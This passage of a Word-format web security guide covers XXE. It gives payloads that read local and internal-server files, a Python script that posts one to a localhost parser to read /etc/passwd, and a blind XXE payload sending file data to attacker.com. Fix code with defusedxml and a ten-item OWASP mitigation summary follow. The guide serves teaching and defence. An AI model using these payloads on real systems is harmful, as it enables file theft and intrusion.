        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "xml": "&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM \"http://internal-server:8080/admin\"&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;"</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t># Attack 4: Windows files</w:t>
        <w:br/>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "xml": "&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM \"file:///c:/windows/system32/drivers/etc/hosts\"&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;"</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:br/>
        <w:t># Python attack script</w:t>
        <w:br/>
        <w:t>import requests</w:t>
        <w:br/>
        <w:br/>
        <w:t>base_url = "http://localhost:5000/parse"</w:t>
        <w:br/>
        <w:br/>
        <w:t># Attempt to read /etc/passwd</w:t>
        <w:br/>
        <w:t>xxe_payload = """&lt;?xml version="1.0"?&gt;</w:t>
        <w:br/>
        <w:t>&lt;!DOCTYPE root [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;</w:t>
        <w:br/>
        <w:t>]&gt;</w:t>
        <w:br/>
        <w:t>&lt;root&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;data&gt;&amp;xxe;&lt;/data&gt;</w:t>
        <w:br/>
        <w:t>&lt;/root&gt;"""</w:t>
        <w:br/>
        <w:br/>
        <w:t>response = requests.post(base_url, json={"xml": xxe_payload})</w:t>
        <w:br/>
        <w:t>print(f"Status: {response.status_code}")</w:t>
        <w:br/>
        <w:t>print(f"Response: {response.json()}")</w:t>
        <w:br/>
        <w:br/>
        <w:t>if response.status_code == 200:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    data = response.json()</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if "sensitive_data" in data:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print("File contents leaked:")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print(data["sensitive_data"])</w:t>
        <w:br/>
        <w:br/>
        <w:t># Blind XXE - Out of band data exfiltration</w:t>
        <w:br/>
        <w:t>blind_xxe = """&lt;?xml version="1.0"?&gt;</w:t>
        <w:br/>
        <w:t>&lt;!DOCTYPE root [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    %dtd;</w:t>
        <w:br/>
        <w:t>]&gt;</w:t>
        <w:br/>
        <w:t>&lt;root&gt;&lt;/root&gt;"""</w:t>
        <w:br/>
        <w:br/>
        <w:t># evil.dtd on attacker server:</w:t>
        <w:br/>
        <w:t># &lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'&gt;"&gt;</w:t>
        <w:br/>
        <w:t># %all;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>FIX CODE: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import xml.etree.ElementTree as ET</w:t>
        <w:br/>
        <w:t>from defusedxml import ElementTree as DefusedET</w:t>
        <w:br/>
        <w:br/>
        <w:t>@app.route("/parse", methods=["POST"])</w:t>
        <w:br/>
        <w:t>def parse_xml():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    xml_input = request.json.get("xml", "")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if not xml_input:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return jsonify({"error": "xml is required"}), 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    # FIX 1: Block DOCTYPE declarations</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if "&lt;!DOCTYPE" in xml_input or "&lt;!ENTITY" in xml_input:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return jsonify({"error": "DOCTYPE and ENTITY declarations are not allowed"}), 400</w:t>
        <w:br/>
        <w:t xml:space="preserve">    </w:t>
        <w:br/>
        <w:t xml:space="preserve">    try:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        # FIX 2: Use defusedxml library which disables XXE by default</w:t>
        <w:br/>
        <w:t xml:space="preserve">        parsed = DefusedET.fromstring(xml_input)</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return jsonify({</w:t>
        <w:br/>
        <w:t xml:space="preserve">            "parsed_output": ET.tostring(parsed, encoding="unicode")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        }), 200</w:t>
        <w:br/>
        <w:t xml:space="preserve">    except Exception as exc:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return jsonify({"error": str(exc)}), 400</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Summary</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>This document covers 10 critical web application security vulnerabilities:</w:t>
        <w:br/>
        <w:br/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1. Unvalidated Redirect - Validate and whitelist redirect URLs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2. SQL Injection - Use parameterized queries</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>3. Cross-Site Scripting (XSS) - Sanitize and escape user input</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>4. Cross-Site Request Forgery (CSRF) - Implement CSRF tokens</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>5. Command Injection - Validate input and avoid shell=True</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>6. Broken Authentication - Implement rate limiting and account lockout</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>7. Directory Traversal - Validate file paths and restrict access</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>8. Insecure Storage - Hash passwords with salt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>9. Security Misconfiguration - Use secure defaults and hide sensitive info</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>10. XML External Entity (XXE) - Disable external entity processing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br/>
        <w:br/>
        <w:t>All these vulnerabilities are based on the OWASP Top 10 and CWE/SANS Top 25 lists.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Always follow secure coding practices and perform regular security audits.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